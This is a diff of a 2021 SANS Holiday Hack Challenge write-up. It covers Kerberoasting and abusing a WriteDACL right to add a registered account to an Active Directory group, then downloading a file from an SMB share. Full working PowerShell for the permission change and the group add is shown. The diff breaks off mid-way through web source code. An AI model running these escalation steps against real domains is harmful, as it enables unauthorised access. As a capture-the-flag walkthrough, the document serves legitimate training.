@@ -640,7 +640,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 146.63 seconds
 ```
 
-With this, we can run the `GetUserSPNs.py` script. Note that we use `elfu.local` for the domain (drop the `0.` at the end):
+With this, we can run the `GetUserSPNs.py` script using the command from [this](https://github.com/chrisjd20/hhc21_powershell_snippets) resource provided in the hints from the elf. Note that we use `elfu.local` for the domain (drop the `0.` at the end):
 ```shell
 pqsgdggdkl@grades:~$ python3 /usr/local/bin/GetUserSPNs.py -outputfile spns.txt -dc-ip 10.128.1.53 'elfu.local/$USER:<password>' -request
 Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
@@ -802,18 +802,6 @@ Binary file ./.cache/powershell/ModuleAnalysisCache-F62D67E4 matches
 ./Encryption.ps1-162-            $PrivateCertPath = Resolve-Path -Path $PrivateCertPath
 ./Encryption.ps1:163:            $privateCertSecurePassword = $PrivateCertPassword | ConvertTo-SecureString -AsPlainText -Force
 --
-./InvokeKerberoast.ps1-384-Get-Domain -Domain testlab.local
-./InvokeKerberoast.ps1-385-.EXAMPLE
-./InvokeKerberoast.ps1:386:$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
---
-./InvokeKerberoast.ps1-758-Find users who doesn't require Kerberos preauthentication and DON'T have an expired password.
-./InvokeKerberoast.ps1-759-.EXAMPLE
-./InvokeKerberoast.ps1:760:$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
---
-./InvokeKerberoast.ps1-1063-format instead of John (the default).
-./InvokeKerberoast.ps1-1064-.EXAMPLE
-./InvokeKerberoast.ps1:1065:$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -orce
---
 ./Run-TestsInNavContainer.ps1-147-        $bcAuthContext = Renew-BcAuthContext $bcAuthContext
 ./Run-TestsInNavContainer.ps1-148-        $accessToken = $bcAuthContext.accessToken
 ./Run-TestsInNavContainer.ps1:149:        $credential = New-Object pscredential -ArgumentList 'someuser', (ConvertTo-SecureString -String 'S0meP@ssword' -AsPlainText -Force)
@@ -891,17 +879,576 @@ https://aka.ms/powershell
 Type 'help' to get help.
 
 PS /home/pqsgdggdkl> ./dc_logon.ps1
-[10.128.1.53]: PS C:\Users\remote_elf\Documents> ls
-
-
-    Directory: C:\Users\remote_elf\Documents
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
--a----       12/23/2021  11:23 PM          42180 output.txt
--a----       12/23/2021  11:15 PM              0 rDACL.ps1
+[10.128.1.53]: PS C:\Users\remote_elf\Documents>
 ```
+
+Next, we need the AD record for this account to be able to grant ourselves the permissions we need:
+
+```shell
+[10.128.1.53]: PS C:\Users\remote_elf\Documents> Get-ADUser ($env:UserName)
+
+
+DistinguishedName : CN=Remote Elf User Account,CN=Users,DC=elfu,DC=local
+Enabled           : True
+GivenName         : ElfU
+Name              : Remote Elf User Account
+ObjectClass       : user
+ObjectGUID        : d74a6e5f-1354-4d5a-bfc3-afd4cb45ae3a
+SamAccountName    : remote_elf
+SID               : S-1-5-21-2037236562-2033616742-1485113978-1106
+Surname           : Service
+UserPrincipalName : remote_elf@elfu.local
+```
+
+Let's also see what groups the `remote_elf` account is in:
+```shell
+[10.128.1.53]: PS C:\Users\remote_elf\Documents> (Get-ADUser $env:UserName -Properties MemberOf).MemberOf
+CN=Remote Management Domain Users,CN=Users,DC=elfu,DC=local
+CN=Remote Management Users,CN=Builtin,DC=elfu,DC=local
+```
+
+We are looking for a "research" document and the above groups don't seem like they would have access to what we want. What other groups are there?
+
+```shell
+[10.128.1.53]: PS C:\Users\remote_elf\Documents> Get-ADGroup -filter * -properties * -searchbase "DC=elfu,DC=local"|Select SAMAccountName, Description
+
+SAMAccountName                          Description
+--------------                          -----------
+Administrators                          Administrators have complete and unrestricted access to the computer/domain
+Users                                   Users are prevented from making accidental or intentional system-wide changes and can r...
+Guests                                  Guests have the same access as members of the Users group by default, except for the Gu...
+Print Operators                         Members can administer printers installed on domain controllers
+Backup Operators                        Backup Operators can override security restrictions for the sole purpose of backing up ...
+Replicator                              Supports file replication in a domain
+Remote Desktop Users                    Members in this group are granted the right to logon remotely
+Network Configuration Operators         Members in this group can have some administrative privileges to manage configuration o...
+Performance Monitor Users               Members of this group can access performance counter data locally and remotely
+Performance Log Users                   Members of this group may schedule logging of performance counters, enable trace provid...
+Distributed COM Users                   Members are allowed to launch, activate and use Distributed COM objects on this machine.
+IIS_IUSRS                               Built-in group used by Internet Information Services.
+Cryptographic Operators                 Members are authorized to perform cryptographic operations.
+Event Log Readers                       Members of this group can read event logs from local machine
+Certificate Service DCOM Access         Members of this group are allowed to connect to Certification Authorities in the enterp...
+RDS Remote Access Servers               Servers in this group enable users of RemoteApp programs and personal virtual desktops ...
+RDS Endpoint Servers                    Servers in this group run virtual machines and host sessions where users RemoteApp prog...
+RDS Management Servers                  Servers in this group can perform routine administrative actions on servers running Rem...
+Hyper-V Administrators                  Members of this group have complete and unrestricted access to all features of Hyper-V.
+Access Control Assistance Operators     Members of this group can remotely query authorization attributes and permissions for r...
+Remote Management Users                 Members of this group can access WMI resources over management protocols (such as WS-Ma...
+Storage Replica Administrators          Members of this group have complete and unrestricted access to all features of Storage ...
+Domain Computers                        All workstations and servers joined to the domain
+Domain Controllers                      All domain controllers in the domain
+Schema Admins                           Designated administrators of the schema
+Enterprise Admins                       Designated administrators of the enterprise
+Cert Publishers                         Members of this group are permitted to publish certificates to the directory
+Domain Admins                           Designated administrators of the domain
+Domain Users                            All domain users
+Domain Guests                           All domain guests
+Group Policy Creator Owners             Members in this group can modify group policy for the domain
+RAS and IAS Servers                     Servers in this group can access remote access properties of users
+Server Operators                        Members can administer domain servers
+Account Operators                       Members can administer domain user and group accounts
+Pre-Windows 2000 Compatible Access      A backward compatibility group which allows read access on all users and groups in the ...
+Incoming Forest Trust Builders          Members of this group can create incoming, one-way trusts to this forest
+Windows Authorization Access Group      Members of this group have access to the computed tokenGroupsGlobalAndUniversal attribu...
+Terminal Server License Servers         Members of this group can update user accounts in Active Directory with information abo...
+Allowed RODC Password Replication Group Members in this group can have their passwords replicated to all read-only domain contr...
+Denied RODC Password Replication Group  Members in this group cannot have their passwords replicated to any read-only domain co...
+Read-only Domain Controllers            Members of this group are Read-Only Domain Controllers in the domain
+Enterprise Read-only Domain Controllers Members of this group are Read-Only Domain Controllers in the enterprise
+Cloneable Domain Controllers            Members of this group that are domain controllers may be cloned.
+Protected Users                         Members of this group are afforded additional protections against authentication securi...
+Key Admins                              Members of this group can perform administrative actions on key objects within the domain.
+Enterprise Key Admins                   Members of this group can perform administrative actions on key objects within the forest.
+DnsAdmins                               DNS Administrators Group
+DnsUpdateProxy                          DNS clients who are permitted to perform dynamic updates on behalf of some other client...
+RemoteManagementDomainUsers             Members of this group are able to winrm into domain machines. Equivilant to being in th...
+ResearchDepartment                      Members of this group have access to all ElfU research resources/shares.
+File Shares
+```
+
+Hmm... `ResearchDepartment` certainly sounds like what we need. Let's get some more information it. Let's see the DN first:
+```shell
+[10.128.1.53]: PS C:\Users\remote_elf\Documents> Get-ADGroup -filter * -properties * -searchbase "CN=Users,DC=elfu,DC=local"|Select SAMAccountName, DistinguishedName
+
+SAMAccountName                          DistinguishedName
+--------------                          -----------------
+Domain Computers                        CN=Domain Computers,CN=Users,DC=elfu,DC=local
+Domain Controllers                      CN=Domain Controllers,CN=Users,DC=elfu,DC=local
+Schema Admins                           CN=Schema Admins,CN=Users,DC=elfu,DC=local
+Enterprise Admins                       CN=Enterprise Admins,CN=Users,DC=elfu,DC=local
+Cert Publishers                         CN=Cert Publishers,CN=Users,DC=elfu,DC=local
+Domain Admins                           CN=Domain Admins,CN=Users,DC=elfu,DC=local
+Domain Users                            CN=Domain Users,CN=Users,DC=elfu,DC=local
+Domain Guests                           CN=Domain Guests,CN=Users,DC=elfu,DC=local
+Group Policy Creator Owners             CN=Group Policy Creator Owners,CN=Users,DC=elfu,DC=local
+RAS and IAS Servers                     CN=RAS and IAS Servers,CN=Users,DC=elfu,DC=local
+Allowed RODC Password Replication Group CN=Allowed RODC Password Replication Group,CN=Users,DC=elfu,DC=local
+Denied RODC Password Replication Group  CN=Denied RODC Password Replication Group,CN=Users,DC=elfu,DC=local
+Read-only Domain Controllers            CN=Read-only Domain Controllers,CN=Users,DC=elfu,DC=local
+Enterprise Read-only Domain Controllers CN=Enterprise Read-only Domain Controllers,CN=Users,DC=elfu,DC=local
+Cloneable Domain Controllers            CN=Cloneable Domain Controllers,CN=Users,DC=elfu,DC=local
+Protected Users                         CN=Protected Users,CN=Users,DC=elfu,DC=local
+Key Admins                              CN=Key Admins,CN=Users,DC=elfu,DC=local
+Enterprise Key Admins                   CN=Enterprise Key Admins,CN=Users,DC=elfu,DC=local
+DnsAdmins                               CN=DnsAdmins,CN=Users,DC=elfu,DC=local
+DnsUpdateProxy                          CN=DnsUpdateProxy,CN=Users,DC=elfu,DC=local
+RemoteManagementDomainUsers             CN=Remote Management Domain Users,CN=Users,DC=elfu,DC=local
+ResearchDepartment                      CN=Research Department,CN=Users,DC=elfu,DC=local
+```
+
+Let's now check if the `remote_elf` user has the `WriteDACL` permission that we need in order to permission our account (the one we registered to get):
+
+```shell
+[10.128.1.53]: PS C:\Users\remote_elf\Documents> $ADSI = [ADSI]"LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
+[10.128.1.53]: PS C:\Users\remote_elf\Documents> $ADSI.psbase.ObjectSecurity.GetAccessRules($true,$true,[Security.Principal.NTAccount])
+
+
+ActiveDirectoryRights : GenericRead
+InheritanceType       : None
+ObjectType            : 00000000-0000-0000-0000-000000000000
+InheritedObjectType   : 00000000-0000-0000-0000-000000000000
+ObjectFlags           : None
+AccessControlType     : Allow
+IdentityReference     : NT AUTHORITY\SELF
+IsInherited           : False
+InheritanceFlags      : None
+PropagationFlags      : None
+
+ActiveDirectoryRights : GenericRead
+InheritanceType       : None
+ObjectType            : 00000000-0000-0000-0000-000000000000
+InheritedObjectType   : 00000000-0000-0000-0000-000000000000
+ObjectFlags           : None
+AccessControlType     : Allow
+IdentityReference     : NT AUTHORITY\Authenticated Users
+IsInherited           : False
+InheritanceFlags      : None
+PropagationFlags      : None
+
+ActiveDirectoryRights : GenericAll
+InheritanceType       : None
+ObjectType            : 00000000-0000-0000-0000-000000000000
+InheritedObjectType   : 00000000-0000-0000-0000-000000000000
+ObjectFlags           : None
+AccessControlType     : Allow
+IdentityReference     : NT AUTHORITY\SYSTEM
+IsInherited           : False
+InheritanceFlags      : None
+PropagationFlags      : None
+
+ActiveDirectoryRights : GenericAll
+InheritanceType       : None
+ObjectType            : 00000000-0000-0000-0000-000000000000
+InheritedObjectType   : 00000000-0000-0000-0000-000000000000
+ObjectFlags           : None
+AccessControlType     : Allow
+IdentityReference     : BUILTIN\Account Operators
+IsInherited           : False
+InheritanceFlags      : None
+PropagationFlags      : None
+
+ActiveDirectoryRights : GenericAll
+InheritanceType       : None
+ObjectType            : 00000000-0000-0000-0000-000000000000
+InheritedObjectType   : 00000000-0000-0000-0000-000000000000
+ObjectFlags           : None
+AccessControlType     : Allow
+IdentityReference     : ELFU\Domain Admins
+IsInherited           : False
+InheritanceFlags      : None
+PropagationFlags      : None
+
+ActiveDirectoryRights : WriteDacl
+InheritanceType       : None
+ObjectType            : 00000000-0000-0000-0000-000000000000
+InheritedObjectType   : 00000000-0000-0000-0000-000000000000
+ObjectFlags           : None
+AccessControlType     : Allow
+IdentityReference     : ELFU\remote_elf
+IsInherited           : False
+InheritanceFlags      : None
+PropagationFlags      : None
+
+ActiveDirectoryRights : ExtendedRight
+InheritanceType       : None
+ObjectType            : ab721a55-1e2f-11d0-9819-00aa0040529b
+InheritedObjectType   : 00000000-0000-0000-0000-000000000000
+ObjectFlags           : ObjectAceTypePresent
+AccessControlType     : Allow
+IdentityReference     : NT AUTHORITY\Authenticated Users
+IsInherited           : False
+InheritanceFlags      : None
+PropagationFlags      : None
+
+ActiveDirectoryRights : ReadProperty
+InheritanceType       : None
+ObjectType            : 46a9b11d-60ae-405a-b7e8-ff8a58d456d2
+InheritedObjectType   : 00000000-0000-0000-0000-000000000000
+ObjectFlags           : ObjectAceTypePresent
+AccessControlType     : Allow
+IdentityReference     : BUILTIN\Windows Authorization Access Group
+IsInherited           : False
+InheritanceFlags      : None
+PropagationFlags      : None
+
+ActiveDirectoryRights : ReadProperty
+InheritanceType       : Descendents
+ObjectType            : 4c164200-20c0-11d0-a768-00aa006e0529
+InheritedObjectType   : 4828cc14-1437-45bc-9b07-ad6f015e5f28
+ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
+AccessControlType     : Allow
+IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
+IsInherited           : True
+InheritanceFlags      : ContainerInherit
+PropagationFlags      : InheritOnly
+
+ActiveDirectoryRights : ReadProperty
+InheritanceType       : Descendents
+ObjectType            : 4c164200-20c0-11d0-a768-00aa006e0529
+InheritedObjectType   : bf967aba-0de6-11d0-a285-00aa003049e2
+ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
+AccessControlType     : Allow
+IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
+IsInherited           : True
+InheritanceFlags      : ContainerInherit
+PropagationFlags      : InheritOnly
+
+ActiveDirectoryRights : ReadProperty
+InheritanceType       : Descendents
+ObjectType            : 5f202010-79a5-11d0-9020-00c04fc2d4cf
+InheritedObjectType   : 4828cc14-1437-45bc-9b07-ad6f015e5f28
+ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
+AccessControlType     : Allow
+IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
+IsInherited           : True
+InheritanceFlags      : ContainerInherit
+PropagationFlags      : InheritOnly
+
+ActiveDirectoryRights : ReadProperty
+InheritanceType       : Descendents
+ObjectType            : 5f202010-79a5-11d0-9020-00c04fc2d4cf
+InheritedObjectType   : bf967aba-0de6-11d0-a285-00aa003049e2
+ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
+AccessControlType     : Allow
+IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
+IsInherited           : True
+InheritanceFlags      : ContainerInherit
+PropagationFlags      : InheritOnly
+
+ActiveDirectoryRights : ReadProperty
+InheritanceType       : Descendents
+ObjectType            : bc0ac240-79a9-11d0-9020-00c04fc2d4cf
+InheritedObjectType   : 4828cc14-1437-45bc-9b07-ad6f015e5f28
+ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
+AccessControlType     : Allow
+IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
+IsInherited           : True
+InheritanceFlags      : ContainerInherit
+PropagationFlags      : InheritOnly
+
+ActiveDirectoryRights : ReadProperty
+InheritanceType       : Descendents
+ObjectType            : bc0ac240-79a9-11d0-9020-00c04fc2d4cf
+InheritedObjectType   : bf967aba-0de6-11d0-a285-00aa003049e2
+ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
+AccessControlType     : Allow
+IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
+IsInherited           : True
+InheritanceFlags      : ContainerInherit
+PropagationFlags      : InheritOnly
+
+ActiveDirectoryRights : ReadProperty
+InheritanceType       : Descendents
+ObjectType            : 59ba2f42-79a2-11d0-9020-00c04fc2d3cf
+InheritedObjectType   : 4828cc14-1437-45bc-9b07-ad6f015e5f28
+ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
+AccessControlType     : Allow
+IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
+IsInherited           : True
+InheritanceFlags      : ContainerInherit
+PropagationFlags      : InheritOnly
+
+ActiveDirectoryRights : ReadProperty
+InheritanceType       : Descendents
+ObjectType            : 59ba2f42-79a2-11d0-9020-00c04fc2d3cf
+InheritedObjectType   : bf967aba-0de6-11d0-a285-00aa003049e2
+ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
+AccessControlType     : Allow
+IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
+IsInherited           : True
+InheritanceFlags      : ContainerInherit
+PropagationFlags      : InheritOnly
+
+ActiveDirectoryRights : ReadProperty
+InheritanceType       : Descendents
+ObjectType            : 037088f8-0ae1-11d2-b422-00a0c968f939
+InheritedObjectType   : 4828cc14-1437-45bc-9b07-ad6f015e5f28
+ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
+AccessControlType     : Allow
+IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
+IsInherited           : True
+InheritanceFlags      : ContainerInherit
+PropagationFlags      : InheritOnly
+
+ActiveDirectoryRights : ReadProperty
+InheritanceType       : Descendents
+ObjectType            : 037088f8-0ae1-11d2-b422-00a0c968f939
+InheritedObjectType   : bf967aba-0de6-11d0-a285-00aa003049e2
+ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
+AccessControlType     : Allow
+IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
+IsInherited           : True
+InheritanceFlags      : ContainerInherit
+PropagationFlags      : InheritOnly
+
+ActiveDirectoryRights : ReadProperty, WriteProperty
+InheritanceType       : All
+ObjectType            : 5b47d60f-6090-40b2-9f37-2a4de88f3063
+InheritedObjectType   : 00000000-0000-0000-0000-000000000000
+ObjectFlags           : ObjectAceTypePresent
+AccessControlType     : Allow
+IdentityReference     : ELFU\Key Admins
+IsInherited           : True
+InheritanceFlags      : ContainerInherit
+PropagationFlags      : None
+
+ActiveDirectoryRights : ReadProperty, WriteProperty
+InheritanceType       : All
+ObjectType            : 5b47d60f-6090-40b2-9f37-2a4de88f3063
+InheritedObjectType   : 00000000-0000-0000-0000-000000000000
+ObjectFlags           : ObjectAceTypePresent
+AccessControlType     : Allow
+IdentityReference     : ELFU\Enterprise Key Admins
+IsInherited           : True
+InheritanceFlags      : ContainerInherit
+PropagationFlags      : None
+
+ActiveDirectoryRights : Self
+InheritanceType       : Descendents
+ObjectType            : 9b026da6-0d3c-465c-8bee-5199d7165cba
+InheritedObjectType   : bf967a86-0de6-11d0-a285-00aa003049e2
+ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
+AccessControlType     : Allow
+IdentityReference     : CREATOR OWNER
+IsInherited           : True
+InheritanceFlags      : ContainerInherit
+PropagationFlags      : InheritOnly
+
+ActiveDirectoryRights : Self
+InheritanceType       : Descendents
+ObjectType            : 9b026da6-0d3c-465c-8bee-5199d7165cba
+InheritedObjectType   : bf967a86-0de6-11d0-a285-00aa003049e2
+ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
+AccessControlType     : Allow
+IdentityReference     : NT AUTHORITY\SELF
+IsInherited           : True
+InheritanceFlags      : ContainerInherit
+PropagationFlags      : InheritOnly
+
+ActiveDirectoryRights : ReadProperty
+InheritanceType       : Descendents
+ObjectType            : b7c69e6d-2cc7-11d2-854e-00a0c983f608
+InheritedObjectType   : bf967a86-0de6-11d0-a285-00aa003049e2
+ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
+AccessControlType     : Allow
+IdentityReference     : NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
+IsInherited           : True
+InheritanceFlags      : ContainerInherit
+PropagationFlags      : InheritOnly
+
+ActiveDirectoryRights : ReadProperty
+InheritanceType       : All
+ObjectType            : b7c69e6d-2cc7-11d2-854e-00a0c983f608
+InheritedObjectType   : bf967a9c-0de6-11d0-a285-00aa003049e2
+ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
+AccessControlType     : Allow
+IdentityReference     : NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
+IsInherited           : True
+InheritanceFlags      : ContainerInherit
+PropagationFlags      : None
+
+ActiveDirectoryRights : ReadProperty
+InheritanceType       : Descendents
+ObjectType            : b7c69e6d-2cc7-11d2-854e-00a0c983f608
+InheritedObjectType   : bf967aba-0de6-11d0-a285-00aa003049e2
+ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
+AccessControlType     : Allow
+IdentityReference     : NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
+IsInherited           : True
+InheritanceFlags      : ContainerInherit
+PropagationFlags      : InheritOnly
+
+ActiveDirectoryRights : WriteProperty
+InheritanceType       : Descendents
+ObjectType            : ea1b7b93-5e48-46d5-bc6c-4df4fda78a35
+InheritedObjectType   : bf967a86-0de6-11d0-a285-00aa003049e2
+ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
+AccessControlType     : Allow
+IdentityReference     : NT AUTHORITY\SELF
+IsInherited           : True
+InheritanceFlags      : ContainerInherit
+PropagationFlags      : InheritOnly
+
+ActiveDirectoryRights : GenericRead
+InheritanceType       : Descendents
+ObjectType            : 00000000-0000-0000-0000-000000000000
+InheritedObjectType   : 4828cc14-1437-45bc-9b07-ad6f015e5f28
+ObjectFlags           : InheritedObjectAceTypePresent
+AccessControlType     : Allow
+IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
+IsInherited           : True
+InheritanceFlags      : ContainerInherit
+PropagationFlags      : InheritOnly
+
+ActiveDirectoryRights : GenericRead
+InheritanceType       : All
+ObjectType            : 00000000-0000-0000-0000-000000000000
+InheritedObjectType   : bf967a9c-0de6-11d0-a285-00aa003049e2
+ObjectFlags           : InheritedObjectAceTypePresent
+AccessControlType     : Allow
+IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
+IsInherited           : True
+InheritanceFlags      : ContainerInherit
+PropagationFlags      : None
+
+ActiveDirectoryRights : GenericRead
+InheritanceType       : Descendents
+ObjectType            : 00000000-0000-0000-0000-000000000000
+InheritedObjectType   : bf967aba-0de6-11d0-a285-00aa003049e2
+ObjectFlags           : InheritedObjectAceTypePresent
+AccessControlType     : Allow
+IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
+IsInherited           : True
+InheritanceFlags      : ContainerInherit
+PropagationFlags      : InheritOnly
+
+ActiveDirectoryRights : ReadProperty, WriteProperty
+InheritanceType       : All
+ObjectType            : 3f78c3e5-f79a-46bd-a0b8-9d18116ddc79
+InheritedObjectType   : 00000000-0000-0000-0000-000000000000
+ObjectFlags           : ObjectAceTypePresent
+AccessControlType     : Allow
+IdentityReference     : NT AUTHORITY\SELF
+IsInherited           : True
+InheritanceFlags      : ContainerInherit, ObjectInherit
+PropagationFlags      : None
+
+ActiveDirectoryRights : ReadProperty, WriteProperty, ExtendedRight
+InheritanceType       : All
+ObjectType            : 91e647de-d96f-4b70-9557-d63ff4f3ccd8
+InheritedObjectType   : 00000000-0000-0000-0000-000000000000
+ObjectFlags           : ObjectAceTypePresent
+AccessControlType     : Allow
+IdentityReference     : NT AUTHORITY\SELF
+IsInherited           : True
+InheritanceFlags      : ContainerInherit
+PropagationFlags      : None
+
+ActiveDirectoryRights : GenericAll
+InheritanceType       : All
+ObjectType            : 00000000-0000-0000-0000-000000000000
+InheritedObjectType   : 00000000-0000-0000-0000-000000000000
+ObjectFlags           : None
+AccessControlType     : Allow
+IdentityReference     : ELFU\Enterprise Admins
+IsInherited           : True
+InheritanceFlags      : ContainerInherit
+PropagationFlags      : None
+
+ActiveDirectoryRights : ListChildren
+InheritanceType       : All
+ObjectType            : 00000000-0000-0000-0000-000000000000
+InheritedObjectType   : 00000000-0000-0000-0000-000000000000
+ObjectFlags           : None
+AccessControlType     : Allow
+IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
+IsInherited           : True
+InheritanceFlags      : ContainerInherit
+PropagationFlags      : None
+
+ActiveDirectoryRights : CreateChild, Self, WriteProperty, ExtendedRight, Delete, GenericRead, WriteDacl, WriteOwner
+InheritanceType       : All
+ObjectType            : 00000000-0000-0000-0000-000000000000
+InheritedObjectType   : 00000000-0000-0000-0000-000000000000
+ObjectFlags           : None
+AccessControlType     : Allow
+IdentityReference     : BUILTIN\Administrators
+IsInherited           : True
+InheritanceFlags      : ContainerInherit
+PropagationFlags      : None
+```
+
+Indeed, it does, so let's add our account. Note that this portion was completed on a different day than the previous so the username is new (must register each day):
+```shell
+Add-Type -AssemblyName System.DirectoryServices
+$ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
+$username = "ncyamjpmrf"
+$nullGUID = [guid]'00000000-0000-0000-0000-000000000000'
+$propGUID = [guid]'00000000-0000-0000-0000-000000000000'
+$IdentityReference = (New-Object System.Security.Principal.NTAccount("elfu.local\$username")).Translate([System.Security.Principal.SecurityIdentifier])
+$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
+$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference, ([System.DirectoryServices.ActiveDirectoryRights] "GenericAll"), ([System.Security.AccessControl.AccessControlType] "Allow"), $propGUID, $inheritanceType, $nullGUID
+$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString
+$secOptions = $domainDirEntry.get_Options()
+$secOptions.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl
+$domainDirEntry.RefreshCache()
+$domainDirEntry.get_ObjectSecurity().AddAccessRule($ACE)
+$domainDirEntry.CommitChanges()
+$domainDirEntry.dispose()
+```
+
+Next, we need to add the account to the group:
+```shell
+Add-Type -AssemblyName System.DirectoryServices
+$ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
+$username = "ncyamjpmrf"
+$password = "Qvytndxki!"
+$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString, $username, $password
+$user = New-Object System.Security.Principal.NTAccount("elfu.local\$username")
+$sid=$user.Translate([System.Security.Principal.SecurityIdentifier])
+$b=New-Object byte[] $sid.BinaryLength
+$sid.GetBinaryForm($b,0)
+$hexSID=[BitConverter]::ToString($b).Replace('-','')
+$domainDirEntry.Add("LDAP://<SID=$hexSID>")
+$domainDirEntry.CommitChanges()
+$domainDirEntry.dispose()
+```
+
+Now, the account is a member of the group:
+
+```shell
+[10.128.1.53]: PS C:\Users\remote_elf\Documents> (Get-ADUser ncyamjpmrf -Properties MemberOf).MemberOf
+CN=Research Department,CN=Users,DC=elfu,DC=local
+```
+
+It takes a while to propagate, but eventually we will be able to access the share drive for the research department (note that the location of the share drive changed when the game was reset at midnight):
+```shell
+ncyamjpmrf@grades:~$ smbclient -U $USER \\\\172.17.0.4\\research_dep
+Enter WORKGROUP\ncyamjpmrf's password:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Thu Dec  2 16:39:42 2021
+  ..                                  D        0  Fri Dec 24 08:01:27 2021
+  SantaSecretToAWonderfulHolidaySeason.pdf      N   173932  Thu Dec  2 16:38:26 2021
+
+		41089256 blocks of size 1024. 34452028 blocks available
+smb: \> get SantaSecretToAWonderfulHolidaySeason.pdf
+getting file \SantaSecretToAWonderfulHolidaySeason.pdf of size 173932 as SantaSecretToAWonderfulHolidaySeason.pdf (56616.6 KiloBytes/sec) (average 56618.5 KiloBytes/sec)
+smb: \> exit
+```
+
+Now, we just have to `scp` to our local machine to view the PDF document:
+```shell
+ncyamjpmrf@grades:~$ logout
+Connection to grades.elfu.org closed.
+stefmolin@penguin ~ % scp -P 2222 ncyamjpmrf@grades.elfu.org:~/SantaSecretToAWonderfulHolidaySeason.pdf ~/Desktop/
+Warning: Permanently added '[grades.elfu.org]:2222,[34.69.96.229]:2222' (ECDSA) to the list of known hosts.
+ncyamjpmrf@grades.elfu.org's password:
+SantaSecretToAWonderfulHolidaySeason.pdf                                                         100%  170KB   1.3MB/s   00:00
+```
+
+Inspect the PDF document to find the answer to the challenge: `Kindness`.
 
 ### 9. Splunk!
 #### Difficulty
@@ -1096,8 +1643,335 @@ ip.flags.rb == 1 and http.request.method == POST and http.file_data contains "10
 Investigate [Frost Tower's website for security issues](https://staging.jackfrosttower.com/). This [source code](https://download.holidayhackchallenge.com/2021/frosttower-web.zip) will be useful in your analysis. In Jack Frost's TODO list, what job position does Jack plan to offer Santa? Ribb Bonbowford, in Santa's dining room, may have some pointers for you.
 
 #### Solution
-(Jack's studio)
+Looking at the source code, the `/search` endpoint looks juicy, but we need to be authenticated for that. The source code for that endpoint is checking authentication by verifying that `session.uniqueID` has a value.
 
+```javascript
+app.get('/search', function(req, res, next) {
+    session = req.session;
+
+    if (session.uniqueID){
+
+        var search = req.query.key;
+        search = "%" + search + "%"
+
+        tempCont.query("SELECT * from uniquecontact WHERE full_name like "+tempCont.escape(search)+" OR email like "+tempCont.escape(search)+" OR phone like "+tempCont.escape(search)+" order by id desc", function(error, rows, fields){
+
+            if (error) {
+                console.log(error);
+                res.sendStatus(500);
+            }
+
+            var rowdata = rows.length;
+
+            //set default variables
+            var totalRecord = rowdata,
+                pageSize = 10,
+                pageCount = Math.ceil(rowdata/10),
+                currentPage = 1,
+                encontact = rows,
+                encontactArrays = [],
+                encontactList = [];
+            //split list into groups
+            while (encontact.length) {
+                encontactArrays.push(encontact.splice(0, pageSize));
+            }
+
+            //set current page if specifed as get variable (eg: /?page=2)
+            if (typeof req.query.page !== 'undefined' && req.query.page == parseInt(req.query.page, 10)) {
+                if (req.query.page <= encontactArrays.length) {
+                    currentPage = +req.query.page;
+                }
+            }
+
+            //show list of encontact from group
+            encontactList = encontactArrays[+currentPage - 1];
+            //render index.ejs view file
+
+            if ( rowdata == "0"){
+
+                res.render('404',
+                    {
+                        'title': 'Record Not Found!',
+                        'userlogin': session.userfullname
+                    }
+
+                );
+            }else{
+
+                res.render('search',
+                    {
+                        'title': 'Form Contact',
+                        'strcountry': countrybuf_tostring,
+                        'encontact': encontactList,
+                        'pageSize': pageSize,
+                        'totalRecord': totalRecord,
+                        'pageCount': pageCount,
+                        'currentPage': currentPage,
+                        'dateFormat': dateFormat,
